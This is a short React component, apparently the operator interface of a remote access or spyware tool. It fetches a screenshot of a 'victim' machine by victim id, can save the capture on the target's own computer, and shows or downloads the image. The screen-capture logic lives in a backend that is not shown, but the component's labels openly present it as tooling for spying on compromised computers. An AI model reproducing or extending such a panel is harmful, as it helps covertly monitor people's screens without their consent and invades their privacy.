import React, { useContext, useState, useEffect } from 'react';
import { ContextHome } from "../../context/ContextHome"

function Captura() {

    const { idVictima, capturarPantalla, capturaPantalla, errorCaptura } = useContext(ContextHome);
    const [urlImagen, seturlImagen] = useState('');

    useEffect(() => {
        if (capturaPantalla && capturaPantalla.img) {
            seturlImagen(`data:image/png;base64,${capturaPantalla.img}`);
        }
    }, [capturaPantalla]);

    const capturar = (e,opcion) => {
        e.preventDefault();
        capturarPantalla(idVictima,opcion);
    };


    return (
        <div>
            {
                errorCaptura && (
                    <div className="alert alert-danger" role="alert">
                        {errorCaptura}
                    </div>
                )
            }

            <div className="row">
                <div className="col">
                    <button className='btn btn-danger' onClick={(e) => capturar(e,'')}>Capturar Pantalla</button>
                </div>
                <div className="col">
                    <button title="guardar la imagen en la pc del cliente" className='btn btn-danger' onClick={(e) => capturar(e,'LOCAL')}>Captura Local</button>
                </div>
                <div className="col">
                    <a href={urlImagen} download="imagen.png" target="_blank" rel="noopener noreferrer" className='btn btn-info'>
                        Descargar Imagen
                    </a>
                </div>
            </div>
            <br />
            {urlImagen && <img src={urlImagen} alt="Captura de pantalla" width={700} />}
        </div>
    )
}

export default Captura